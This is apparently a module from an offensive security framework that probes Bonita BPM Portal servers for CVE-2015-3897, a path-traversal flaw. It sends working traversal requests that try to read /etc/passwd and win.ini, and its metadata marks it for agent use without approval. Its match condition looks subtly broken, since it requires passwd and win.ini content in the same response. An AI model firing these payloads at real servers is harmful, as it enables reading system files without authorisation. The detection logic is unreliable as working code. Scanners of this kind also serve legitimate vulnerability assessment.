#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Bonita BPM Portal before 6."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Bonita BPM Portal <6.5.3 - Local File Inclusion Detection',
        'description': 'Bonita BPM Portal before 6.5.3 allows remote attackers to read arbitrary files via a .. (dot dot) in the theme parameter and a file path in the location parameter to bonita/portal/themeResource.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2015', 'unauth', 'packetstorm', 'bonita', 'lfi', 'bonitasoft', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://packetstormsecurity.com/files/132237/Bonita-BPM-6.5.1-Directory-Traversal-Open-Redirect.html',
            'https://www.bonitasoft.com/',
            'https://nvd.nist.gov/vuln/detail/CVE-2015-3897',
            'https://www.htbridge.com/advisory/HTB23259',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2015-3897',
    }

    def run(self):
        for path in ('/bonita/portal/themeResource?theme=portal/../../../../../../../../../../../../../../../../&location=etc/passwd', '/bonita/portal/themeResource?theme=portal/../../../../../../../../../../../../../../../../&location=Windows/win.ini'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            body_all = ('bit app support', 'fonts', 'extensions',)
            body_regexes = ('root:[x*]:0:0:',)
            if (all(m in body for m in body_all)) and (any(re.search(rx, body, 0) for rx in body_regexes)):
                self.set_info(
                    severity='medium',
                    reason="Bonita BPM Portal <6.5.3 - Local File Inclusion detected",
                    path=path,
                )
                return True
        return False

